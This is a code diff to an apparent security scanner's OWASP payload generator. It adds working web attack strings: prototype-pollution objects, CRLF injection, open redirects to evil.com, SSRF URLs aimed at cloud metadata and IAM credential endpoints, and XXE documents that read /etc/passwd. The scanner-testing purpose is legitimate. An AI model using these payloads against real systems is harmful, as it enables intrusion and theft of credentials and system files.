@@ -621,26 +621,47 @@ async function generateOwaspPayloads(
       'admin:admin', 'admin:password', 'root:root',
       'test:test', 'admin:123456',
     ],
-    // A08: Data Integrity Failures (deserialization)
+    // A08: Data Integrity Failures (deserialization + prototype pollution)
     a08_integrity: [
       'O:8:"stdClass":0:{}', // PHP deserialization
       'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==', // Java
       '{"__proto__":{"polluted":true}}', // Prototype pollution
+      '{"constructor":{"prototype":{"isAdmin":true}}}',
+      'a]0[]=1', // PHP array injection
     ],
     // A09: Logging & Monitoring (CRLF injection for log poisoning)
     a09_logging: [
       '%0d%0aInjected-Header:true',
       '\r\nSet-Cookie:pwned=1',
       '%0aFake-Log-Entry',
+      '%0d%0aLocation: https://evil.com',
     ],
     // A10: SSRF
     a10_ssrf: [
       'http://169.254.169.254/latest/meta-data/',
+      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
       'http://127.0.0.1:80/',
+      'http://127.0.0.1:8080/',
+      'http://127.0.0.1:3000/',
       'file:///etc/passwd',
+      'file:///etc/hosts',
       'http://[::1]/',
       'http://0x7f000001/',
       'gopher://127.0.0.1:25/',
+      'http://metadata.google.internal/computeMetadata/v1/',
+      'http://100.100.100.200/latest/meta-data/',
+      'dict://127.0.0.1:11211/info',
+    ],
+    // Open Redirect
+    a01_redirect: [
+      '//evil.com', 'https://evil.com', '/\\evil.com',
+      '//evil.com/%2f..', 'https:evil.com', '////evil.com',
+      'javascript:alert(1)//', '/redirect?url=https://evil.com',
+    ],
+    // XXE (XML External Entity)
+    a03_xxe: [
+      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
     ]
   };
 
